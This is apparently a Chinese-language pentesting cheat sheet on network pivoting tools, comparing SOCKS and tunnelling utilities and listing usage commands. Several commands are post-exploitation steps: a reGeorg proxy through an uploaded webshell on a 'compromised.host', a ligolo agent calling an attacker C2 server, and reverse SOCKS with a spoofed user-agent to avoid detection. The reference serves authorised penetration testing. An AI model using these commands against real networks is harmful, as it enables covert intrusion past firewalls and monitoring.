# 网络内网穿透工具 (Network Pivoting Tools)

## 工具对比 (Tools Comparison)

下表对比了各种工具的平台支持情况（Windows、Linux、macOS）、可用的轮询方法（HTTPS、WebSockets）以及支持的 SOCKS 版本（4/5）。

| 名称         | SOCKS4 | SOCKS5 | SOCKET | HTTPS | Web Socket | Windows | Linux | MacOS  | Tun 接口 |
| ------------ | ------ | ------ | ------ | ----- | ---------- | ------- | ----- | -----  | ------------  |
| SSH          |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| reGeorg      |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| pivotnacci   |     ✅ |     ✅ |     ❌ |    ✅ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| wstunnel     |     ✅ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| chisel       |     ❌ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| revsocks     |     ❌ |     ✅ |     ✅ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| ligolo-ng    |     ❌ |     ❌ |     ✅ |    ❌ |         ✅ |     ✅  |   ✅  |     ✅ |           ✅ |
| gost         |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ✅ |
| rpivot       |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |

## 工具 (Tools)

### wstunnel

* [erebe/wstunnel](https://github.com/erebe/wstunnel) - 通过 Websocket 或 HTTP2 建立隧道 - 绕过防火墙/DPI - 提供静态二进制文件。

```ps1
wstunnel server wss://[::]:8080
wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://myRemoteHost:8080
curl -x socks5h://127.0.0.1:8888 http://google.com/
```

### chisel

* [jpillora/chisel](https://github.com/jpillora/chisel) - 一个快速的基于 HTTP 的 TCP/UDP 隧道工具。

```powershell
chisel server -p 8008 --reverse
chisel.exe client 你的_IP:8008 R:socks
```

### revsocks

* [kost/revsocks](https://github.com/kost/revsocks) - 使用 Go 编写的反向 SOCKS5 实现。

使用 websocket 的反向 SOCKS：

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass 超强密码 -tls -ws
revsocks -connect https://客户端IP:8443 -pass 超强密码 -ws
```

使用 TLS 加密的反向 SOCKS：

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass 超强密码
revsocks -connect 客户端IP:8443 -pass 超强密码
```

使用 TCP 的反向 SOCKS：

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass 超强密码 -tls
revsocks -connect 客户端IP:8443 -pass 超强密码 -tls
```

* 在连接上设置强密码：`-pass Password1234`
* 使用身份验证代理：`-proxy proxy.domain.local:3128 -proxyauth 域名/用户名:用户密码`
* 定义 User-Agent 以减少被发现的可能性：`-useragent "Mozilla 5.0/IE Windows 10"`

### ssh

```bash
ssh -N -f -D [监听端口] [用户]@[主机]
```

### reGeorg

* [sensepost/reGeorg](https://github.com/sensepost/reGeorg)，reDuh 的继承者，可攻陷堡垒 Web 服务器并通过 DMZ 创建 SOCKS 代理。内网穿透并进行渗透。

```python
python reGeorgSocksProxy.py --listen-port 8080 --url http://compromised.host/shell.jsp
```

* **步骤 1**。将隧道文件（`aspx|ashx|jsp|php`）上传到 Web 服务器。
* **步骤 2**。配置工具使用 SOCKS 代理，填写启动 `reGeorgSocksProxy.py` 时指定的 IP 地址和端口。

### pivotnacci

* [blackarrowsec/pivotnacci](https://github.com/blackarrowsec/pivotnacci)，一种通过 HTTP 代理 (agents) 建立 SOCKS 连接的工具。

```powershell
pip3 install pivotnacci
用法: pivotnacci [-h] [-s 地址] [-p 端口] [--verbose] [--ack-message 消息]
                  [--password 密码] [--user-agent 浏览器标识]
                  [--header 请求头] [--proxy [协议://]主机[:端口]]
                  [--type 类型] [--polling-interval 毫秒]
                  [--request-tries 次数] [--retry-interval 毫秒]
                  URL

pivotnacci  https://domain.com/agent.php --password "s3cr3t" --polling-interval 2000
```

### ligolo

Ligolo-ng 不使用 SOCKS 代理或 TCP/UDP 转发器，而是使用 Gvisor 创建用户态网络栈。

* [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) - 一个先进且简单的隧道/内网穿透工具，使用 TUN 接口。
* [sysdream/ligolo](https://github.com/sysdream/ligolo) - 为渗透测试人员设计的简单反向隧道工具。

```ps1
./proxy -h # 帮助选项
./proxy -autocert # 自动请求 LetsEncrypt 证书
./proxy -selfcert # 使用自签名证书
./agent -connect 攻击者_C2_服务器.com:11601

ligolo-ng » session 
? 指定一个会话 : 1

interface_create --name ligolo
route_add --name ligolo --route 10.24.0.0/24
tunnel_start --tun ligolo
```

### gost

* [ginuerzh/gost](https://github.com/ginuerzh/gost) - GO Simple Tunnel - 一个使用 Go 编写的简单隧道工具。

```ps1
gost -L=socks5://:1080 # 服务器
gost -L=:8080 -F=socks5://服务器_IP:1080?notls=true # 客户端
```

### sshuttle

* [sshuttle/sshuttle](https://github.com/sshuttle/sshuttle) - 透传代理服务器，可作为简易 VPN 使用。通过 SSH 进行转发。

```ps1
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
```

## 参考资料 (References)

* [GO Simple Tunnel - Documentation](https://gost.run/en/)
* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
* [sshutle - Documentation](https://sshuttle.readthedocs.io/en/stable/usage.html)
